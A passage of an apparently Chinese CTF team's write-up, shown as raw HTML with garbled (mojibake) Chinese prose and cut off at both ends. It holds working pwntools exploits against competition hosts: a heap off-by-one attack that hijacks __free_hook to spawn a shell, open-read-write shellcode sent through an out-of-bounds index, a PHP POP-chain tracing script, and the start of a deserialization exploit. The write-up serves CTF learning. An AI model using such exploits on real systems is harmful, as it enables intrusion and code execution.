class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>è¾“å…¥å‡½æ•°å­˜åœ¨off by oneæ¼æ´</p><p>ç”±äºè¦ç»•è¿‡æ£€æŸ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨largebinçš„æ®‹ç•™æ•°æ®ä¼ªé€ chunkï¼Œå†é€šè¿‡off by oneæ”¹inuseä½ï¼Œå®ç°unlinkï¼Œè¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹fdï¼Œç”±äºè¾“å…¥å‡½æ•°ä¼šæ”¾â€˜\x00â€™ï¼Œè¿™é‡Œè¦çˆ†ç ´ä¸€ä¸‹ï¼Œåé¢å°±æ˜¯leakå’Œæ‰“freehookäº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="å¼ºç½‘å…ˆé”‹-orw-SOLVED-NN"><a href="#å¼ºç½‘å…ˆé”‹-orw-SOLVED-NN" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]orw | SOLVED | NN"></a>[å¼ºç½‘å…ˆé”‹]orw | SOLVED | NN</h2><p>å¯¹elfæ–‡ä»¶idaæ‰“å¼€ååˆ†æå¯çŸ¥å­˜åœ¨ä¸‹æ ‡è¶Šç•Œå’Œè¾“å…¥æ— é™åˆ¶æ¼æ´ã€‚</p><p>æŒ‡é’ˆæ•°ç»„çš„ä¸‹æ ‡v1æ²¡æœ‰æ£€æŸ¥</p><p>ç›´æ¥å›è½¦ï¼Œå°±èƒ½æ— é™è¾“å…¥ï¼Œæ‘†è„±å¤§å°é™åˆ¶ã€‚</p><p>ç›´æ¥åˆ©ç”¨ä¸‹æ ‡è¶Šç•Œï¼Œç”³è¯·ä¸€ä¸ªchunkåˆ†é…ç»™-25çš„ä½ç½®ï¼Œåœ¨è¾“å…¥shellcodeå®ç°orwï¼Œæœ€åè§¦å‘ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>ç›´æ¥å†™è„šæœ¬å›æº¯POPé“¾ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥æ‰¾æ˜¯å¦æœ‰ç›´æ¥èµ‹å€¼æ±¡æŸ“å˜é‡</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># æŸ¥æ‰¾æ˜¯å¦æœ‰ifè¯­å¥åæ±¡æŸ“å˜é‡</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="èµŒå¾’-done-Err0r"><a href="#èµŒå¾’-done-Err0r" class="headerlink" title="èµŒå¾’ | done | Err0r"></a>èµŒå¾’ | done | Err0r</h2><p>æ‰«ç›®å½•å‘ç°<code>www.zip</code></p><p>å‘ç°æ˜¯ååºåˆ—åŒ–ï¼Œexpï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"give you flag : "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token 